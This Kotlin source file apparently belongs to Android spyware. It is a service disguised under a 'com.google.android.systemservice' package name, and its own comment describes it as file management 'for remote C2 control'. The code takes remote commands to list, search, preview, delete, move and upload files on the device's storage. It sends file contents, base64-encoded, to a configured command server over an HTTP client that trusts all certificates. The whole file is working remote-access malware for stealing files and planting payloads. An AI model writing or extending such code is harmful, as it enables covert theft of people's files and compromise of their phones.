package com.google.android.systemservice.services

import android.app.Service
import android.content.Intent
import android.os.Environment
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import android.util.Base64

/**
 * File browser service — comprehensive file management for remote C2 control.
 * Handles: list, download, upload, delete, rename, move, search, preview
 */
class FileBrowserService : Service() {

    companion object {
        private const val TAG = "FileBrowser"
        private const val MAX_ENTRIES = 500
        private const val MAX_PREVIEW_SIZE = 1024 * 1024 // 1MB
        private const val CHUNK_SIZE = 5 * 1024 * 1024 // 5MB for chunked uploads

        private val BLOCKED_PREFIXES = listOf("/data/data/", "/system/", "/proc/", "/dev/")
    }

    private fun isPathSafe(path: String): Boolean {
        return try {
            val file = File(path)
            val canonical = file.canonicalPath

            // Reject path traversal segments
            if (path.contains("..")) return false

            // Reject symbolic links (canonical differs from absolute)
            if (canonical != file.absolutePath) return false

            // Reject sensitive system directories
            if (BLOCKED_PREFIXES.any { canonical.startsWith(it) }) return false

            // Must be under an allowed base directory
            val allowedBases = listOf(
                Environment.getExternalStorageDirectory().canonicalPath,
                filesDir.canonicalPath,
                cacheDir.canonicalPath
            )
            allowedBases.any { canonical.startsWith(it) }
        } catch (e: Exception) {
            Log.w(TAG, "Path safety check failed for $path: ${e.message}")
            false
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val requestId = intent?.getStringExtra("request_id")
        val command = intent?.getStringExtra("command") ?: "list_files"
        val params = intent?.getStringExtra("params") ?: "{}"

        Thread {
            try {
                val paramsJson = JSONObject(params)
                when (command) {
                    "list_files" -> {
                        val path = paramsJson.optString("path", Environment.getExternalStorageDirectory().absolutePath)
                        val recursive = paramsJson.optBoolean("recursive", false)
                        listFiles(requestId, path, recursive)
                    }
                    "download_file" -> {
                        val path = paramsJson.optString("path")
                        downloadFile(requestId, path)
                    }
                    "upload_file" -> {
                        val destinationPath = paramsJson.optString("destination_path")
                        val filename = paramsJson.optString("filename")
                        val contentBase64 = paramsJson.optString("content_base64")
                        uploadFile(requestId, destinationPath, filename, contentBase64)
                    }
                    "upload_file_chunk" -> {
                        val uploadId = paramsJson.optString("upload_id")
                        val chunkIndex = paramsJson.optInt("chunk_index")
                        val totalChunks = paramsJson.optInt("total_chunks")
                        val filename = paramsJson.optString("filename")
                        val destinationPath = paramsJson.optString("destination_path")
                        val chunkData = paramsJson.optString("chunk_data")
                        uploadFileChunk(requestId, uploadId, chunkIndex, totalChunks, filename, destinationPath, chunkData)
                    }
                    "delete_file" -> {
                        val path = paramsJson.optString("path")
                        deleteFile(requestId, path)
                    }
                    "preview_file" -> {
                        val path = paramsJson.optString("path")
                        val maxSize = paramsJson.optLong("max_size", MAX_PREVIEW_SIZE.toLong())
                        previewFile(requestId, path, maxSize)
                    }
                    "rename_file" -> {
                        val oldPath = paramsJson.optString("old_path")
                        val newName = paramsJson.optString("new_name")
                        renameFile(requestId, oldPath, newName)
                    }
                    "move_file" -> {
                        val sourcePath = paramsJson.optString("source_path")
                        val destinationPath = paramsJson.optString("destination_path")
                        moveFile(requestId, sourcePath, destinationPath)
                    }
                    "search_files" -> {
                        val query = paramsJson.optString("query")
                        val basePath = paramsJson.optString("path", Environment.getExternalStorageDirectory().absolutePath)
                        searchFiles(requestId, query, basePath)
                    }
                    else -> {
                        sendErrorResponse(requestId, "Unknown command: $command")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing $command: ${e.message}")
                sendErrorResponse(requestId, e.message ?: "Unknown error")
            } finally {
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopForeground(false)
        super.onDestroy()
    }

    private fun listFiles(requestId: String?, path: String, recursive: Boolean) {
        if (!isPathSafe(path)) {
            Log.w(TAG, "Path traversal blocked for listFiles: $path")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) {
                sendErrorResponse(requestId, "Not a directory: $path")
                return
            }

            val entries = if (recursive) {
                listFilesRecursive(dir)
            } else {
                listFilesSingle(dir)
            }

            sendResponse(requestId, JSONObject().apply {
                put("action", "list_files")
                put("command", "list_files")
                put("path", path)
                put("parent", dir.parent ?: "/")
                put("entries", entries)
                put("count", entries.length())
                put("success", true)
                put("timestamp", System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error listing $path: ${e.message}")
            sendErrorResponse(requestId, "Error listing directory: ${e.message}")
        }
    }

    private fun listFilesSingle(dir: File): JSONArray {
        val entries = JSONArray()
        dir.listFiles()
            ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
            ?.take(MAX_ENTRIES)
            ?.forEach { file ->
                entries.put(createFileEntry(file))
            }
        return entries
    }

    private fun listFilesRecursive(dir: File, maxDepth: Int = 3, currentDepth: Int = 0): JSONArray {
        val entries = JSONArray()
        if (currentDepth >= maxDepth) return entries

        dir.listFiles()?.forEach { file ->
            entries.put(createFileEntry(file))
            if (file.isDirectory && currentDepth < maxDepth - 1) {
                val subEntries = listFilesRecursive(file, maxDepth, currentDepth + 1)
                for (i in 0 until subEntries.length()) {
                    entries.put(subEntries.getJSONObject(i))
                }
            }
        }
        return entries
    }

    private fun createFileEntry(file: File): JSONObject {
        return JSONObject().apply {
            put("name", file.name)
            put("path", file.absolutePath)
            put("is_directory", file.isDirectory)
            put("size", if (file.isFile) file.length() else 0)
            put("size_readable", formatSize(file.length()))
            put("last_modified", file.lastModified())
            put("readable", file.canRead())
            put("writable", file.canWrite())
            put("extension", file.extension)
        }
    }

    private fun downloadFile(requestId: String?, path: String) {
        if (!isPathSafe(path)) {
            Log.w(TAG, "Path traversal blocked for downloadFile: $path")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val file = File(path)
            if (!file.exists() || !file.isFile) {
                sendErrorResponse(requestId, "File not found: $path")
                return
            }

            if (!file.canRead()) {
                sendErrorResponse(requestId, "Permission denied: $path")
                return
            }

            // For files under 5MB, send base64
            if (file.length() <= CHUNK_SIZE) {
                val bytes = file.readBytes()
                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                sendResponse(requestId, JSONObject().apply {
                    put("action", "download_file")
                    put("command", "download_file")
                    put("path", path)
                    put("filename", file.name)
                    put("size", file.length())
                    put("content_base64", base64)
                    put("success", true)
                    put("timestamp", System.currentTimeMillis())
                })
            } else {
                sendErrorResponse(requestId, "File too large (>5MB): ${file.length()} bytes. Use chunked download.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error downloading $path: ${e.message}")
            sendErrorResponse(requestId, "Download error: ${e.message}")
        }
    }

    private fun uploadFile(requestId: String?, destinationPath: String, filename: String, contentBase64: String) {
        val fullPath = File(destinationPath, filename).absolutePath
        if (!isPathSafe(destinationPath) || !isPathSafe(fullPath)) {
            Log.w(TAG, "Path traversal blocked for uploadFile: $destinationPath/$filename")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            // Decode base64 content
            val content = Base64.decode(contentBase64, Base64.NO_WRAP)

            // Create destination file
            val destDir = File(destinationPath)
            if (!destDir.exists()) {
                destDir.mkdirs()
            }

            val destFile = File(destDir, filename)
            destFile.writeBytes(content)

            sendResponse(requestId, JSONObject().apply {
                put("action", "upload_file")
                put("command", "upload_file")
                put("filename", filename)
                put("path", destFile.absolutePath)
                put("size", content.size)
                put("success", true)
                put("timestamp", System.currentTimeMillis())
            })

            Log.d(TAG, "File uploaded: ${destFile.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading file: ${e.message}")
            sendErrorResponse(requestId, "Upload error: ${e.message}")
        }
    }

    private fun uploadFileChunk(
        requestId: String?,
        uploadId: String,
        chunkIndex: Int,
        totalChunks: Int,
        filename: String,
        destinationPath: String,
        chunkData: String
    ) {
        val fullPath = File(destinationPath, filename).absolutePath
        if (!isPathSafe(destinationPath) || !isPathSafe(fullPath)) {
            Log.w(TAG, "Path traversal blocked for uploadFileChunk: $destinationPath/$filename")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            // Decode chunk data
            val chunk = Base64.decode(chunkData, Base64.NO_WRAP)

            // Create temp directory for chunks
            val tempDir = File(cacheDir, "uploads/$uploadId")
            if (!tempDir.exists()) {
                tempDir.mkdirs()
            }

            // Save chunk
            val chunkFile = File(tempDir, "chunk_$chunkIndex")
            chunkFile.writeBytes(chunk)

            Log.d(TAG, "Chunk $chunkIndex/$totalChunks saved for upload $uploadId")

            // If this is the last chunk, assemble the file
            if (chunkIndex == totalChunks - 1) {
                assembleChunkedFile(uploadId, totalChunks, filename, destinationPath, requestId)
            } else {
                // Send progress update
                sendResponse(requestId, JSONObject().apply {
                    put("action", "upload_file_chunk")
                    put("command", "upload_file_chunk")
                    put("upload_id", uploadId)
                    put("chunk_index", chunkIndex)
                    put("total_chunks", totalChunks)
                    put("progress", ((chunkIndex + 1) * 100) / totalChunks)
                    put("success", true)
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading chunk: ${e.message}")
            sendErrorResponse(requestId, "Chunk upload error: ${e.message}")
        }
    }

    private fun assembleChunkedFile(
        uploadId: String,
        totalChunks: Int,
        filename: String,
        destinationPath: String,
        requestId: String?
    ) {
        try {
            val tempDir = File(cacheDir, "uploads/$uploadId")
            val destDir = File(destinationPath)
            if (!destDir.exists()) {
                destDir.mkdirs()
            }

            val destFile = File(destDir, filename)
            FileOutputStream(destFile).use { output ->
                for (i in 0 until totalChunks) {
                    val chunkFile = File(tempDir, "chunk_$i")
                    if (!chunkFile.exists()) {
                        throw Exception("Missing chunk $i")
                    }
                    FileInputStream(chunkFile).use { input ->
                        input.copyTo(output)
                    }
                }
            }

            // Clean up temp files
            tempDir.deleteRecursively()

            sendResponse(requestId, JSONObject().apply {
                put("action", "upload_file")
                put("command", "upload_file")
                put("filename", filename)
                put("path", destFile.absolutePath)
                put("size", destFile.length())
                put("success", true)
                put("message", "Chunked upload completed")
                put("timestamp", System.currentTimeMillis())
            })

            Log.d(TAG, "Chunked file assembled: ${destFile.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "Error assembling chunks: ${e.message}")
            sendErrorResponse(requestId, "Assembly error: ${e.message}")
        }
    }

    private fun deleteFile(requestId: String?, path: String) {
        if (!isPathSafe(path)) {
            Log.w(TAG, "Path traversal blocked for deleteFile: $path")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val file = File(path)
            if (!file.exists()) {
                sendErrorResponse(requestId, "File not found: $path")
                return
            }

            val success = if (file.isDirectory) {
                file.deleteRecursively()
            } else {
                file.delete()
            }

            if (success) {
                sendResponse(requestId, JSONObject().apply {
                    put("action", "delete_file")
                    put("command", "delete_file")
                    put("path", path)
                    put("success", true)
                    put("timestamp", System.currentTimeMillis())
                })
                Log.d(TAG, "Deleted: $path")
            } else {
                sendErrorResponse(requestId, "Failed to delete: $path")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting $path: ${e.message}")
            sendErrorResponse(requestId, "Delete error: ${e.message}")
        }
    }

    private fun previewFile(requestId: String?, path: String, maxSize: Long) {
        if (!isPathSafe(path)) {
            Log.w(TAG, "Path traversal blocked for previewFile: $path")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val file = File(path)
            if (!file.exists() || !file.isFile) {
                sendErrorResponse(requestId, "File not found: $path")
                return
            }

            if (file.length() > maxSize) {
                sendErrorResponse(requestId, "File too large for preview: ${file.length()} bytes")
                return
            }

            // Determine content type
            val contentType = determineContentType(file)
            val content = when {
                contentType.startsWith("text/") -> file.readText()
                contentType.startsWith("image/") -> Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                else -> "Binary file (${file.length()} bytes)"
            }

            sendResponse(requestId, JSONObject().apply {
                put("action", "preview_file")
                put("command", "preview_file")
                put("filename", file.name)
                put("path", path)
                put("content_type", contentType)
                put("content", content)
                put("size", file.length())
                put("success", true)
                put("timestamp", System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error previewing $path: ${e.message}")
            sendErrorResponse(requestId, "Preview error: ${e.message}")
        }
    }

    private fun renameFile(requestId: String?, oldPath: String, newName: String) {
        if (!isPathSafe(oldPath)) {
            Log.w(TAG, "Path traversal blocked for renameFile: $oldPath")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val file = File(oldPath)
            if (!file.exists()) {
                sendErrorResponse(requestId, "File not found: $oldPath")
                return
            }

            val newFile = File(file.parent, newName)
            val success = file.renameTo(newFile)

            if (success) {
                sendResponse(requestId, JSONObject().apply {
                    put("action", "rename_file")
                    put("command", "rename_file")
                    put("old_path", oldPath)
                    put("new_path", newFile.absolutePath)
                    put("success", true)
                    put("timestamp", System.currentTimeMillis())
                })
                Log.d(TAG, "Renamed: $oldPath -> ${newFile.absolutePath}")
            } else {
                sendErrorResponse(requestId, "Failed to rename: $oldPath")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error renaming $oldPath: ${e.message}")
            sendErrorResponse(requestId, "Rename error: ${e.message}")
        }
    }

    private fun moveFile(requestId: String?, sourcePath: String, destinationPath: String) {
        if (!isPathSafe(sourcePath) || !isPathSafe(destinationPath)) {
            Log.w(TAG, "Path traversal blocked for moveFile: $sourcePath -> $destinationPath")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val sourceFile = File(sourcePath)
            if (!sourceFile.exists()) {
                sendErrorResponse(requestId, "Source file not found: $sourcePath")
                return
            }

            val destFile = File(destinationPath)
            if (destFile.isDirectory) {
                // Moving into directory
                val finalDest = File(destFile, sourceFile.name)
                val success = sourceFile.renameTo(finalDest)
                
                if (success) {
                    sendResponse(requestId, JSONObject().apply {
                        put("action", "move_file")
                        put("command", "move_file")
                        put("source_path", sourcePath)
                        put("destination_path", finalDest.absolutePath)
                        put("success", true)
                        put("timestamp", System.currentTimeMillis())
                    })
                } else {
                    sendErrorResponse(requestId, "Failed to move file")
                }
            } else {
                // Renaming/moving to specific path
                val success = sourceFile.renameTo(destFile)
                
                if (success) {
                    sendResponse(requestId, JSONObject().apply {
                        put("action", "move_file")
                        put("command", "move_file")
                        put("source_path", sourcePath)
                        put("destination_path", destFile.absolutePath)
                        put("success", true)
                        put("timestamp", System.currentTimeMillis())
                    })
                } else {
                    sendErrorResponse(requestId, "Failed to move file")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error moving file: ${e.message}")
            sendErrorResponse(requestId, "Move error: ${e.message}")
        }
    }

    private fun searchFiles(requestId: String?, query: String, basePath: String) {
        if (!isPathSafe(basePath)) {
            Log.w(TAG, "Path traversal blocked for searchFiles: $basePath")
            sendErrorResponse(requestId, "Access denied: path not allowed")
            return
        }
        try {
            val baseDir = File(basePath)
            if (!baseDir.exists() || !baseDir.isDirectory) {
                sendErrorResponse(requestId, "Invalid base path: $basePath")
                return
            }

            val results = JSONArray()
            searchFilesRecursive(baseDir, query.lowercase(), results, 0, 100)

            sendResponse(requestId, JSONObject().apply {
                put("action", "search_files")
                put("command", "search_files")
                put("query", query)
                put("base_path", basePath)
                put("results", results)
                put("count", results.length())
                put("success", true)
                put("timestamp", System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error searching files: ${e.message}")
            sendErrorResponse(requestId, "Search error: ${e.message}")
        }
    }

    private fun searchFilesRecursive(
        dir: File,
        query: String,
        results: JSONArray,
        depth: Int,
        maxResults: Int
    ) {
        if (depth > 5 || results.length() >= maxResults) return

        dir.listFiles()?.forEach { file ->
            if (file.name.lowercase().contains(query)) {
                results.put(createFileEntry(file))
            }
            if (file.isDirectory) {
                searchFilesRecursive(file, query, results, depth + 1, maxResults)
            }
        }
    }

    private fun determineContentType(file: File): String {
        return when (file.extension.lowercase()) {
            "txt", "log", "md", "xml", "json", "html", "css", "js" -> "text/plain"
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "pdf" -> "application/pdf"
            "mp4", "avi", "mkv" -> "video/mp4"
            "mp3", "wav", "ogg" -> "audio/mpeg"
            else -> "application/octet-stream"
        }
    }

    private fun sendResponse(requestId: String?, payload: JSONObject) {
        try {
            payload.put("device_id", AndroidConfig.deviceId)
            payload.put("request_id", requestId ?: "")

            val client = TrustAllCertificates.createClientBuilder().build()
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${AndroidConfig.apiBaseUrl}/file_browser")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Response sent successfully for request: $requestId")
                } else {
                    Log.w(TAG, "Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error sending response: ${e.message}")
        }
    }

    private fun sendErrorResponse(requestId: String?, error: String) {
        sendResponse(requestId, JSONObject().apply {
            put("success", false)
            put("error", error)
            put("timestamp", System.currentTimeMillis())
        })
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> "${bytes / (1024 * 1024 * 1024)} GB"
        }
    }
}
